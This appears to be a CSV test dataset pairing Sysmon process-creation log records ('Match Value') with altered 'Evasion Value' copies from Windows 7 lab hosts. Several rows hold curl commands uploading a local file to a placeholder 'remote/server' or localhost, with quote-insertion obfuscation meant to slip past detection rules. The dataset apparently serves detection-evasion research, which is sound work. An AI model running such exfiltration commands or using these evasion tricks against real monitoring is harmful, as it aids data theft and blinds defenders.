Match Value,Evasion Value
"{'executable': 'C:\\Windows\\System32\\curl.exe', 'command_line': 'curl.exe -F file=C:\\upload\\this\\file.txt http://remote/server', 'name': 'python.exe', 'hash': {'sha256': 'd61ddea87b2483612caeb0f3514aee3e60237d5f3880f49512c834539462742e', 'md5': 'edc79826e21859e93a875dfc087606c5'}, 'entity_id': '{19FC45AC-7535-601C-0000-0010DAC90200}', 'pid': 2424, 'working_directory': 'C:\\BREACH\\', 'parent': {'pid': 2340, 'executable': 'C:\\Program Files\\Python35-32\\python.exe', 'command_line': '""C:\\Program Files\\Python35-32\\python.exe"" ""C:\\BREACH\\init_tbf_client.py"" ', 'name': 'python.exe', 'args': ['C:\\Program Files\\Python35-32\\python.exe', 'C:\\BREACH\\init_tbf_client.py'], 'entity_id': '{19FC45AC-7534-601C-0000-001004B80200}'}, 'args': ['python', 'C:\\BREACH\\userbehavior.pex', '--use-breach-setup']}","{'pid': 296, 'executable': 'C:\\Windows\\System32\\curl.exe', 'parent': {'entity_id': '{19FC45AC-76E6-601C-0000-0010502F0000}', 'pid': 236, 'executable': 'C:\\Windows\\System32\\smss.exe', 'command_line': '\\SystemRoot\\System32\\smss.exe', 'name': 'smss.exe', 'args': ['\\SystemRoot\\System32\\smss.exe']}, 'name': 'smss.exe', 'args': ['\\SystemRoot\\System32\\smss.exe', '00000000', '0000003c'], 'entity_id': '{19FC45AC-76E7-601C-0000-001085440000}', 'working_directory': 'C:\\Windows\\', 'hash': {'md5': '01c6c743fe49d0fb3f0a1391fef1deb3', 'sha256': '36155638e650576a8bcafc23c50483ab4b831d9a34c781ddf7cc89554d0546b7'}, 'command_line': 'curl.exe -""""F file=C:\\\\upload\\\\this\\\\file.txt http://remote/server""'}"
2021-02-04T22:29:09.420Z,2021-02-04T22:35:03.130Z
"{'user': 'client1', 'hash': ['edc79826e21859e93a875dfc087606c5', 'd61ddea87b2483612caeb0f3514aee3e60237d5f3880f49512c834539462742e']}","{'user': 'client1', 'hash': ['cabb20e171770ff64614a54c1f31c033', 'c0e3087d87c84776fe7ffca768a0793c02d28e34a821f0c9da32339af8e7e6a6']}"
"{'sha256': 'd61ddea87b2483612caeb0f3514aee3e60237d5f3880f49512c834539462742e', 'md5': 'edc79826e21859e93a875dfc087606c5'}","{'md5': 'cabb20e171770ff64614a54c1f31c033', 'sha256': 'c0e3087d87c84776fe7ffca768a0793c02d28e34a821f0c9da32339af8e7e6a6'}"
"{'version': '7.10.2', 'hostname': 'CLIENT1', 'ephemeral_id': 'c6dab1c1-2860-4ed8-b41c-e6b57498568e', 'id': 'c58de8d4-8be2-444c-bc20-92fab97cbaf5', 'name': 'CLIENT1', 'type': 'winlogbeat'}","{'version': '7.10.2', 'hostname': 'CLIENT1', 'ephemeral_id': '486f7872-9118-4349-8630-511973cdbf72', 'id': 'c58de8d4-8be2-444c-bc20-92fab97cbaf5', 'name': 'CLIENT1', 'type': 'winlogbeat'}"
"{'api': 'wineventlog', 'opcode': 'Info', 'version': 5, 'process': {'pid': 1524, 'thread': {'id': 1792}}, 'event_id': 1, 'record_id': 1303, 'task': 'Process Create (rule: ProcessCreate)', 'provider_guid': '{5770385F-C22A-43E0-BF4C-06F5698FFBD9}', 'provider_name': 'Microsoft-Windows-Sysmon', 'event_data': {'Description': 'Python', 'Company': 'Python Software Foundation', 'OriginalFileName': 'python.exe', 'LogonGuid': '{19FC45AC-7533-601C-0000-0020ED4A0200}', 'IntegrityLevel': 'Medium', 'LogonId': '0x24aed', 'TerminalSessionId': '1', 'Product': 'Python', 'FileVersion': '3.5.2'}, 'user': {'type': 'User', 'identifier': 'S-1-5-18', 'name': 'SYSTEM', 'domain': 'NT AUTHORITY'}, 'channel': 'Microsoft-Windows-Sysmon/Operational', 'computer_name': 'CLIENT1.breach.local'}","{'opcode': 'Info', 'user': {'domain': 'NT AUTHORITY', 'type': 'User', 'identifier': 'S-1-5-18', 'name': 'SYSTEM'}, 'computer_name': 'CLIENT1.breach.local', 'api': 'wineventlog', 'event_id': 1, 'provider_name': 'Microsoft-Windows-Sysmon', 'record_id': 1354, 'provider_guid': '{5770385F-C22A-43E0-BF4C-06F5698FFBD9}', 'version': 5, 'channel': 'Microsoft-Windows-Sysmon/Operational', 'event_data': {'FileVersion': '6.1.7600.16385 (win7_rtm.090713-1255)', 'LogonGuid': '{19FC45AC-7690-601C-0000-002053FB0000}', 'IntegrityLevel': 'Medium', 'Description': 'IP Configuration Utility', 'TerminalSessionId': '1', 'Product': 'Microsoft® Windows® Operating System', 'LogonId': '0xfb53', 'Company': 'Microsoft Corporation', 'OriginalFileName': 'ipconfig.exe'}, 'task': 'Process Create (rule: ProcessCreate)', 'process': {'pid': 1928, 'thread': {'id': 1716}}}"
"{'type': ['start', 'process_start'], 'kind': 'event', 'code': 1, 'provider': 'Microsoft-Windows-Sysmon', 'action': 'Process Create (rule: ProcessCreate)', 'created': '2021-02-04T22:31:06.300Z', 'module': 'sysmon', 'category': ['process']}","{'code': 1, 'provider': 'Microsoft-Windows-Sysmon', 'action': 'Process Create (rule: ProcessCreate)', 'created': '2021-02-04T22:37:09.060Z', 'module': 'sysmon', 'type': ['start', 'process_start'], 'category': ['process'], 'kind': 'event'}"
"Process Create:
RuleName: 
UtcTime: 2021-02-04 22:29:09.420
ProcessGuid: {19FC45AC-7535-601C-0000-0010DAC90200}
ProcessId: 2424
Image: C:\Program Files\Python35-32\python.exe
FileVersion: 3.5.2
Description: Python
Product: Python
Company: Python Software Foundation
OriginalFileName: python.exe
CommandLine: python C:\BREACH\userbehavior.pex --use-breach-setup
CurrentDirectory: C:\BREACH\
User: BREACH\client1
LogonGuid: {19FC45AC-7533-601C-0000-0020ED4A0200}
LogonId: 0x24aed
TerminalSessionId: 1
IntegrityLevel: Medium
Hashes: MD5=EDC79826E21859E93A875DFC087606C5,SHA256=D61DDEA87B2483612CAEB0F3514AEE3E60237D5F3880F49512C834539462742E
ParentProcessGuid: {19FC45AC-7534-601C-0000-001004B80200}
ParentProcessId: 2340
ParentImage: C:\Program Files\Python35-32\python.exe
ParentCommandLine: ""C:\Program Files\Python35-32\python.exe"" ""C:\BREACH\init_tbf_client.py"" ","Process Create:
RuleName: 
UtcTime: 2021-02-04 22:35:03.130
ProcessGuid: {19FC45AC-7697-601C-0000-0010C3C60100}
ProcessId: 904
Image: C:\Windows\System32\ipconfig.exe
FileVersion: 6.1.7600.16385 (win7_rtm.090713-1255)
Description: IP Configuration Utility
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
OriginalFileName: ipconfig.exe
CommandLine: ipconfig /all
CurrentDirectory: C:\BREACH\
User: BREACH\client1
LogonGuid: {19FC45AC-7690-601C-0000-002053FB0000}
LogonId: 0xfb53
TerminalSessionId: 1
IntegrityLevel: Medium
Hashes: MD5=CABB20E171770FF64614A54C1F31C033,SHA256=C0E3087D87C84776FE7FFCA768A0793C02D28E34A821F0C9DA32339AF8E7E6A6
ParentProcessGuid: {19FC45AC-7695-601C-0000-0010FF940100}
ParentProcessId: 1940
ParentImage: C:\Program Files\Python35-32\python.exe
ParentCommandLine: python C:\BREACH\userbehavior.pex --use-breach-setup"
"{'executable': 'C:\\Windows\\System32\\curl.exe', 'command_line': 'curl.exe -F file=C:\\upload\\this\\file.txt http://remote/server', 'name': 'python.exe', 'hash': {'sha256': 'd61ddea87b2483612caeb0f3514aee3e60237d5f3880f49512c834539462742e', 'md5': 'edc79826e21859e93a875dfc087606c5'}, 'entity_id': '{19FC45AC-7535-601C-0000-0010DAC90200}', 'pid': 2424, 'working_directory': 'C:\\BREACH\\', 'parent': {'pid': 2340, 'executable': 'C:\\Program Files\\Python35-32\\python.exe', 'command_line': '""C:\\Program Files\\Python35-32\\python.exe"" ""C:\\BREACH\\init_tbf_client.py"" ', 'name': 'python.exe', 'args': ['C:\\Program Files\\Python35-32\\python.exe', 'C:\\BREACH\\init_tbf_client.py'], 'entity_id': '{19FC45AC-7534-601C-0000-001004B80200}'}, 'args': ['python', 'C:\\BREACH\\userbehavior.pex', '--use-breach-setup']}","{'command_line': 'curl ""-F"" myfile.txt 127.0.0.1:88', 'working_directory': 'C:\\BREACH\\', 'parent': {'name': 'python.exe', 'args': ['python', 'C:\\BREACH\\userbehavior.pex', '--use-breach-setup'], 'entity_id': '{19FC45AC-7695-601C-0000-0010FF940100}', 'pid': 1940, 'executable': 'C:\\Program Files\\Python35-32\\python.exe', 'command_line': 'python C:\\BREACH\\userbehavior.pex --use-breach-setup'}, 'args': ['ipconfig', '/all'], 'entity_id': '{19FC45AC-7697-601C-0000-0010C3C60100}', 'pid': 904, 'hash': {'md5': 'cabb20e171770ff64614a54c1f31c033', 'sha256': 'c0e3087d87c84776fe7ffca768a0793c02d28e34a821f0c9da32339af8e7e6a6'}, 'executable': 'C:\\Windows\\System32\\curl.exe', 'name': 'ipconfig.exe'}"
2021-02-04T22:29:09.420Z,2021-02-04T22:27:20.203Z
"{'name': 'client1', 'domain': 'BREACH'}","{'domain': 'client', 'name': 'setup'}"
"{'user': 'client1', 'hash': ['edc79826e21859e93a875dfc087606c5', 'd61ddea87b2483612caeb0f3514aee3e60237d5f3880f49512c834539462742e']}","{'user': 'setup', 'hash': ['452fa961163ef4aee4815796a13ab2cf', '14dc422082f96f5c21c41a5e5f6e8445547cc4b02b18f0a86a34669ca2ce18a7']}"
"{'sha256': 'd61ddea87b2483612caeb0f3514aee3e60237d5f3880f49512c834539462742e', 'md5': 'edc79826e21859e93a875dfc087606c5'}","{'md5': '452fa961163ef4aee4815796a13ab2cf', 'sha256': '14dc422082f96f5c21c41a5e5f6e8445547cc4b02b18f0a86a34669ca2ce18a7'}"
"{'version': '7.10.2', 'hostname': 'CLIENT1', 'ephemeral_id': 'c6dab1c1-2860-4ed8-b41c-e6b57498568e', 'id': 'c58de8d4-8be2-444c-bc20-92fab97cbaf5', 'name': 'CLIENT1', 'type': 'winlogbeat'}","{'type': 'winlogbeat', 'version': '7.10.2', 'hostname': 'CLIENT2', 'ephemeral_id': '805d2621-88bc-4353-a953-25544d012426', 'id': 'c58de8d4-8be2-444c-bc20-92fab97cbaf5', 'name': 'CLIENT2'}"
"{'api': 'wineventlog', 'opcode': 'Info', 'version': 5, 'process': {'pid': 1524, 'thread': {'id': 1792}}, 'event_id': 1, 'record_id': 1303, 'task': 'Process Create (rule: ProcessCreate)', 'provider_guid': '{5770385F-C22A-43E0-BF4C-06F5698FFBD9}', 'provider_name': 'Microsoft-Windows-Sysmon', 'event_data': {'Description': 'Python', 'Company': 'Python Software Foundation', 'OriginalFileName': 'python.exe', 'LogonGuid': '{19FC45AC-7533-601C-0000-0020ED4A0200}', 'IntegrityLevel': 'Medium', 'LogonId': '0x24aed', 'TerminalSessionId': '1', 'Product': 'Python', 'FileVersion': '3.5.2'}, 'user': {'type': 'User', 'identifier': 'S-1-5-18', 'name': 'SYSTEM', 'domain': 'NT AUTHORITY'}, 'channel': 'Microsoft-Windows-Sysmon/Operational', 'computer_name': 'CLIENT1.breach.local'}","{'process': {'pid': 1896, 'thread': {'id': 1392}}, 'event_id': 1, 'api': 'wineventlog', 'provider_name': 'Microsoft-Windows-Sysmon', 'task': 'Process Create (rule: ProcessCreate)', 'provider_guid': '{5770385F-C22A-43E0-BF4C-06F5698FFBD9}', 'version': 5, 'user': {'name': 'SYSTEM', 'domain': 'NT AUTHORITY', 'type': 'User', 'identifier': 'S-1-5-18'}, 'event_data': {'IntegrityLevel': 'High', 'Company': 'Adobe Systems Incorporated', 'TerminalSessionId': '1', 'LogonGuid': '{19FC45AC-74C5-601C-0000-0020F4FF0000}', 'LogonId': '0xfff4', 'Description': 'Adobe Acrobat SpeedLauncher', 'Product': 'Adobe Acrobat', 'FileVersion': '9.1.0.2009022700', 'OriginalFileName': 'AcroSpeedLaunch.exe'}, 'record_id': 1174, 'opcode': 'Info', 'channel': 'Microsoft-Windows-Sysmon/Operational', 'computer_name': 'CLIENT'}"
"{'type': ['start', 'process_start'], 'kind': 'event', 'code': 1, 'provider': 'Microsoft-Windows-Sysmon', 'action': 'Process Create (rule: ProcessCreate)', 'created': '2021-02-04T22:31:06.300Z', 'module': 'sysmon', 'category': ['process']}","{'code': 1, 'module': 'sysmon', 'category': ['process'], 'type': ['start', 'process_start'], 'provider': 'Microsoft-Windows-Sysmon', 'action': 'Process Create (rule: ProcessCreate)', 'created': '2021-02-04T22:31:11.355Z', 'kind': 'event'}"
"{'architecture': 'x86', 'os': {'platform': 'windows', 'version': '6.1', 'family': 'windows', 'name': 'Windows 7 Professional', 'kernel': '6.1.7601.18741 (win7sp1_gdr.150202-1526)', 'build': '7601.0'}, 'name': 'CLIENT1.breach.local', 'id': '19fc45ac-5890-4f96-81b1-50ed111c0ce4', 'ip': ['192.168.56.101', '172.16.1.1', 'fe80::5efe:c0a8:3865', 'fe80::5efe:ac10:101'], 'mac': ['00:50:56:00:03:01', '00:50:56:00:00:01', '00:00:00:00:00:00:00:e0', '00:00:00:00:00:00:00:e0'], 'hostname': 'CLIENT1'}","{'mac': ['00:50:56:00:03:02', '00:50:56:00:00:02', '00:00:00:00:00:00:00:e0', '00:00:00:00:00:00:00:e0'], 'hostname': 'CLIENT2', 'architecture': 'x86', 'os': {'family': 'windows', 'name': 'Windows 7 Professional', 'kernel': '6.1.7601.18741 (win7sp1_gdr.150202-1526)', 'build': '7601.0', 'platform': 'windows', 'version': '6.1'}, 'id': '19fc45ac-5890-4f96-81b1-50ed111c0ce4', 'ip': ['192.168.56.102', '172.16.1.2', 'fe80::5efe:c0a8:3866', 'fe80::5efe:ac10:102'], 'name': 'CLIENT'}"
"Process Create:
RuleName: 
UtcTime: 2021-02-04 22:29:09.420
ProcessGuid: {19FC45AC-7535-601C-0000-0010DAC90200}
ProcessId: 2424
Image: C:\Program Files\Python35-32\python.exe
FileVersion: 3.5.2
Description: Python
Product: Python
Company: Python Software Foundation
OriginalFileName: python.exe
CommandLine: python C:\BREACH\userbehavior.pex --use-breach-setup
CurrentDirectory: C:\BREACH\
User: BREACH\client1
LogonGuid: {19FC45AC-7533-601C-0000-0020ED4A0200}
LogonId: 0x24aed
TerminalSessionId: 1
IntegrityLevel: Medium
Hashes: MD5=EDC79826E21859E93A875DFC087606C5,SHA256=D61DDEA87B2483612CAEB0F3514AEE3E60237D5F3880F49512C834539462742E
ParentProcessGuid: {19FC45AC-7534-601C-0000-001004B80200}
ParentProcessId: 2340
ParentImage: C:\Program Files\Python35-32\python.exe
ParentCommandLine: ""C:\Program Files\Python35-32\python.exe"" ""C:\BREACH\init_tbf_client.py"" ","Process Create:
RuleName: 
UtcTime: 2021-02-04 22:27:20.203
ProcessGuid: {19FC45AC-74C8-601C-0000-0010E87C0100}
ProcessId: 1596
Image: C:\Program Files\Adobe\Reader 9.0\Reader\reader_sl.exe
FileVersion: 9.1.0.2009022700
Description: Adobe Acrobat SpeedLauncher
Product: Adobe Acrobat
Company: Adobe Systems Incorporated
OriginalFileName: AcroSpeedLaunch.exe
CommandLine: ""C:\Program Files\Adobe\Reader 9.0\Reader\reader_sl.exe"" 
CurrentDirectory: C:\Windows\system32\
User: client\setup
LogonGuid: {19FC45AC-74C5-601C-0000-0020F4FF0000}
LogonId: 0xfff4
TerminalSessionId: 1
IntegrityLevel: High
Hashes: MD5=452FA961163EF4AEE4815796A13AB2CF,SHA256=14DC422082F96F5C21C41A5E5F6E8445547CC4B02B18F0A86A34669CA2CE18A7
ParentProcessGuid: {19FC45AC-74C6-601C-0000-0010E21B0100}
ParentProcessId: 1292
ParentImage: C:\Windows\explorer.exe
ParentCommandLine: C:\Windows\Explorer.EXE"
"{'executable': 'C:\\Windows\\System32\\curl.exe', 'command_line': 'curl.exe -F file=C:\\upload\\this\\file.txt http://remote/server', 'name': 'python.exe', 'hash': {'sha256': 'd61ddea87b2483612caeb0f3514aee3e60237d5f3880f49512c834539462742e', 'md5': 'edc79826e21859e93a875dfc087606c5'}, 'entity_id': '{19FC45AC-7535-601C-0000-0010DAC90200}', 'pid': 2424, 'working_directory': 'C:\\BREACH\\', 'parent': {'pid': 2340, 'executable': 'C:\\Program Files\\Python35-32\\python.exe', 'command_line': '""C:\\Program Files\\Python35-32\\python.exe"" ""C:\\BREACH\\init_tbf_client.py"" ', 'name': 'python.exe', 'args': ['C:\\Program Files\\Python35-32\\python.exe', 'C:\\BREACH\\init_tbf_client.py'], 'entity_id': '{19FC45AC-7534-601C-0000-001004B80200}'}, 'args': ['python', 'C:\\BREACH\\userbehavior.pex', '--use-breach-setup']}","{'working_directory': 'C:\\Windows\\system32\\', 'parent': {'executable': 'C:\\Windows\\explorer.exe', 'command_line': 'C:\\Windows\\Explorer.EXE', 'name': 'explorer.exe', 'args': ['C:\\Windows\\Explorer.EXE'], 'entity_id': '{19FC45AC-74C6-601C-0000-0010E21B0100}', 'pid': 1292}, 'args': ['C:\\Program Files\\Adobe\\Reader 9.0\\Reader\\reader_sl.exe'], 'hash': {'md5': '452fa961163ef4aee4815796a13ab2cf', 'sha256': '14dc422082f96f5c21c41a5e5f6e8445547cc4b02b18f0a86a34669ca2ce18a7'}, 'executable': 'C:\\Windows\\System32\\curl.exe', 'command_line': 'curl -""F"" file=upload_file.txt http://127.0.0.1/upload', 'name': 'reader_sl.exe', 'entity_id': '{19FC45AC-74C8-601C-0000-0010E87C0100}', 'pid': 1596}"
2021-02-04T22:28:12.015Z,2021-02-04T22:29:07.436Z
"{'domain': 'NT AUTHORITY', 'name': 'SYSTEM'}","{'name': 'client1', 'domain': 'BREACH'}"
"{'user': 'SYSTEM', 'hash': ['91fed64cc1898029441c31a98b1b8fe4', '608d4ebba90fd2ed66bbdf392898df10a302f884e8ecb8d6f5bc8fab99accb4e']}","{'hash': ['61ac3efdfacfdd3f0f11dd4fd4044223', '538fe1012fedc72727a8de0c2c01944b3d35c29812ecef88e95aac07235e0b0b'], 'user': 'client1'}"
"{'hostname': 'CLIENT1', 'name': 'CLIENT1', 'architecture': 'x86', 'os': {'version': '6.1', 'family': 'windows', 'name': 'Windows 7 Professional', 'kernel': '6.1.7601.18741 (win7sp1_gdr.150202-1526)', 'build': '7601.0', 'platform': 'windows'}, 'id': '19fc45ac-5890-4f96-81b1-50ed111c0ce4', 'ip': ['192.168.56.101', '172.16.1.1', 'fe80::5efe:c0a8:3865', 'fe80::5efe:ac10:101'], 'mac': ['00:50:56:00:03:01', '00:50:56:00:00:01', '00:00:00:00:00:00:00:e0', '00:00:00:00:00:00:00:e0']}","{'mac': ['00:50:56:00:03:01', '00:50:56:00:00:01', '00:00:00:00:00:00:00:e0', '00:00:00:00:00:00:00:e0'], 'hostname': 'CLIENT1', 'architecture': 'x86', 'os': {'family': 'windows', 'name': 'Windows 7 Professional', 'kernel': '6.1.7601.18741 (win7sp1_gdr.150202-1526)', 'build': '7601.0', 'platform': 'windows', 'version': '6.1'}, 'id': '19fc45ac-5890-4f96-81b1-50ed111c0ce4', 'name': 'CLIENT1.breach.local', 'ip': ['192.168.56.101', '172.16.1.1', 'fe80::5efe:c0a8:3865', 'fe80::5efe:ac10:101']}"
"{'type': ['start', 'process_start'], 'kind': 'event', 'code': 1, 'provider': 'Microsoft-Windows-Sysmon', 'action': 'Process Create (rule: ProcessCreate)', 'created': '2021-02-04T22:31:06.130Z', 'module': 'sysmon', 'category': ['process']}","{'kind': 'event', 'code': 1, 'provider': 'Microsoft-Windows-Sysmon', 'action': 'Process Create (rule: ProcessCreate)', 'created': '2021-02-04T22:31:06.299Z', 'module': 'sysmon', 'category': ['process'], 'type': ['start', 'process_start']}"
"{'provider_name': 'Microsoft-Windows-Sysmon', 'record_id': 1225, 'task': 'Process Create (rule: ProcessCreate)', 'api': 'wineventlog', 'version': 5, 'channel': 'Microsoft-Windows-Sysmon/Operational', 'opcode': 'Info', 'provider_guid': '{5770385F-C22A-43E0-BF4C-06F5698FFBD9}', 'process': {'pid': 1504, 'thread': {'id': 1772}}, 'user': {'identifier': 'S-1-5-18', 'name': 'SYSTEM', 'domain': 'NT AUTHORITY', 'type': 'User'}, 'event_data': {'LogonId': '0x3e7', 'Product': 'Microsoft® Windows® Operating System', 'TerminalSessionId': '0', 'OriginalFileName': 'unsecapp.dll', 'LogonGuid': '{19FC45AC-74F9-601C-0000-0020E7030000}', 'Company': 'Microsoft Corporation', 'IntegrityLevel': 'System', 'Description': 'Sink to receive asynchronous callbacks for WMI client application', 'FileVersion': '10.0.14409.1005 (rs1_srvoob.161208-1155)'}, 'event_id': 1, 'computer_name': 'CLIENT1'}","{'computer_name': 'CLIENT1.breach.local', 'opcode': 'Info', 'provider_guid': '{5770385F-C22A-43E0-BF4C-06F5698FFBD9}', 'event_id': 1, 'api': 'wineventlog', 'provider_name': 'Microsoft-Windows-Sysmon', 'event_data': {'IntegrityLevel': 'Medium', 'LogonId': '0x24aed', 'FileVersion': '6.1.7601.17514 (win7sp1_rtm.101119-1850)', 'Description': 'Userinit Logon Application', 'Company': 'Microsoft Corporation', 'TerminalSessionId': '1', 'LogonGuid': '{19FC45AC-7533-601C-0000-0020ED4A0200}', 'Product': 'Microsoft® Windows® Operating System', 'OriginalFileName': 'USERINIT.EXE'}, 'task': 'Process Create (rule: ProcessCreate)', 'version': 5, 'channel': 'Microsoft-Windows-Sysmon/Operational', 'record_id': 1293, 'process': {'pid': 1524, 'thread': {'id': 1792}}, 'user': {'type': 'User', 'identifier': 'S-1-5-18', 'name': 'SYSTEM', 'domain': 'NT AUTHORITY'}}"
"{'executable': 'C:\\Users\\joe\\Downloads\\BGInfo\\bginfo.exe', 'command_line': 'C:\\Users\\joe\\Downloads\\BGInfo\\bginfo.exe /popup /nolicprompt %TEMP%\\bginfo.bgi', 'working_directory': 'C:\\Windows\\system32\\', 'parent': {'args': ['C:\\Windows\\system32\\svchost.exe', '-k', 'DcomLaunch'], 'entity_id': '{19FC45AC-74F9-601C-0000-0010B8790000}', 'pid': 568, 'executable': 'C:\\Windows\\System32\\svchost.exe', 'command_line': 'C:\\Windows\\system32\\svchost.exe -k DcomLaunch', 'name': 'svchost.exe'}, 'name': 'unsecapp.exe', 'hash': {'sha256': '608d4ebba90fd2ed66bbdf392898df10a302f884e8ecb8d6f5bc8fab99accb4e', 'md5': '91fed64cc1898029441c31a98b1b8fe4'}, 'entity_id': '{19FC45AC-74FC-601C-0000-0010565A0100}', 'pid': 1692, 'args': ['C:\\Windows\\system32\\wbem\\unsecapp.exe', '-Embedding']}","{'entity_id': '{19FC45AC-7533-601C-0000-001024560200}', 'command_line': 'C:\\Users\\joe\\Downloads\\BGInfo\\bginfo.exe /""popup"" /""nolicprompt"" %TEMP%\\bginfo.bgi', 'parent': {'executable': 'C:\\Windows\\System32\\winlogon.exe', 'command_line': 'winlogon.exe', 'name': 'winlogon.exe', 'args': ['winlogon.exe'], 'entity_id': '{19FC45AC-7527-601C-0000-001099590000}', 'pid': 384}, 'name': 'userinit.exe', 'hash': {'md5': '61ac3efdfacfdd3f0f11dd4fd4044223', 'sha256': '538fe1012fedc72727a8de0c2c01944b3d35c29812ecef88e95aac07235e0b0b'}, 'pid': 940, 'executable': 'C:\\Users\\joe\\Downloads\\BGInfo\\bginfo.exe', 'working_directory': 'C:\\Windows\\system32\\', 'args': ['C:\\Windows\\system32\\userinit.exe']}"
"{'md5': '91fed64cc1898029441c31a98b1b8fe4', 'sha256': '608d4ebba90fd2ed66bbdf392898df10a302f884e8ecb8d6f5bc8fab99accb4e'}","{'md5': '61ac3efdfacfdd3f0f11dd4fd4044223', 'sha256': '538fe1012fedc72727a8de0c2c01944b3d35c29812ecef88e95aac07235e0b0b'}"
"Process Create:
RuleName: 
UtcTime: 2021-02-04 22:28:12.015
ProcessGuid: {19FC45AC-74FC-601C-0000-0010565A0100}
ProcessId: 1692
Image: C:\Windows\System32\wbem\unsecapp.exe
FileVersion: 10.0.14409.1005 (rs1_srvoob.161208-1155)
Description: Sink to receive asynchronous callbacks for WMI client application
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
OriginalFileName: unsecapp.dll
CommandLine: C:\Windows\system32\wbem\unsecapp.exe -Embedding
CurrentDirectory: C:\Windows\system32\
User: NT AUTHORITY\SYSTEM
LogonGuid: {19FC45AC-74F9-601C-0000-0020E7030000}
LogonId: 0x3e7
TerminalSessionId: 0
IntegrityLevel: System
Hashes: MD5=91FED64CC1898029441C31A98B1B8FE4,SHA256=608D4EBBA90FD2ED66BBDF392898DF10A302F884E8ECB8D6F5BC8FAB99ACCB4E
ParentProcessGuid: {19FC45AC-74F9-601C-0000-0010B8790000}
ParentProcessId: 568
ParentImage: C:\Windows\System32\svchost.exe
ParentCommandLine: C:\Windows\system32\svchost.exe -k DcomLaunch","Process Create:
RuleName: 
UtcTime: 2021-02-04 22:29:07.436
ProcessGuid: {19FC45AC-7533-601C-0000-001024560200}
ProcessId: 940
Image: C:\Windows\System32\userinit.exe
FileVersion: 6.1.7601.17514 (win7sp1_rtm.101119-1850)
Description: Userinit Logon Application
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
OriginalFileName: USERINIT.EXE
CommandLine: C:\Windows\system32\userinit.exe
CurrentDirectory: C:\Windows\system32\
User: BREACH\client1
LogonGuid: {19FC45AC-7533-601C-0000-0020ED4A0200}
LogonId: 0x24aed
TerminalSessionId: 1
IntegrityLevel: Medium
Hashes: MD5=61AC3EFDFACFDD3F0F11DD4FD4044223,SHA256=538FE1012FEDC72727A8DE0C2C01944B3D35C29812ECEF88E95AAC07235E0B0B
ParentProcessGuid: {19FC45AC-7527-601C-0000-001099590000}
ParentProcessId: 384
ParentImage: C:\Windows\System32\winlogon.exe
ParentCommandLine: winlogon.exe"
2021-02-04T22:28:12.015Z,2021-02-05T05:02:00.128Z
"{'user': 'SYSTEM', 'hash': ['91fed64cc1898029441c31a98b1b8fe4', '608d4ebba90fd2ed66bbdf392898df10a302f884e8ecb8d6f5bc8fab99accb4e']}","{'user': 'SYSTEM', 'hash': ['1234a12b71dae034e45c714ae5a54412', '079e6bc834f38322ed5ed76295ec3961ed894084ef5cb171dffbd9b3822cc78d']}"
"{'ephemeral_id': 'c6dab1c1-2860-4ed8-b41c-e6b57498568e', 'id': 'c58de8d4-8be2-444c-bc20-92fab97cbaf5', 'name': 'CLIENT1', 'type': 'winlogbeat', 'version': '7.10.2', 'hostname': 'CLIENT1'}","{'type': 'winlogbeat', 'version': '7.10.2', 'hostname': 'CLIENT3', 'ephemeral_id': '177650cc-629c-4abf-8b93-a90e2e515251', 'id': 'c58de8d4-8be2-444c-bc20-92fab97cbaf5', 'name': 'CLIENT3'}"
"{'hostname': 'CLIENT1', 'name': 'CLIENT1', 'architecture': 'x86', 'os': {'version': '6.1', 'family': 'windows', 'name': 'Windows 7 Professional', 'kernel': '6.1.7601.18741 (win7sp1_gdr.150202-1526)', 'build': '7601.0', 'platform': 'windows'}, 'id': '19fc45ac-5890-4f96-81b1-50ed111c0ce4', 'ip': ['192.168.56.101', '172.16.1.1', 'fe80::5efe:c0a8:3865', 'fe80::5efe:ac10:101'], 'mac': ['00:50:56:00:03:01', '00:50:56:00:00:01', '00:00:00:00:00:00:00:e0', '00:00:00:00:00:00:00:e0']}","{'mac': ['00:50:56:00:03:03', '00:50:56:00:00:03', '00:00:00:00:00:00:00:e0', '00:00:00:00:00:00:00:e0'], 'hostname': 'CLIENT3', 'architecture': 'x86', 'os': {'platform': 'windows', 'version': '6.1', 'family': 'windows', 'name': 'Windows 7 Professional', 'kernel': '6.1.7601.18741 (win7sp1_gdr.150202-1526)', 'build': '7601.0'}, 'id': '19fc45ac-5890-4f96-81b1-50ed111c0ce4', 'ip': ['192.168.56.103', '172.16.1.3', 'fe80::5efe:c0a8:3867', 'fe80::5efe:ac10:103'], 'name': 'CLIENT3.breach.local'}"
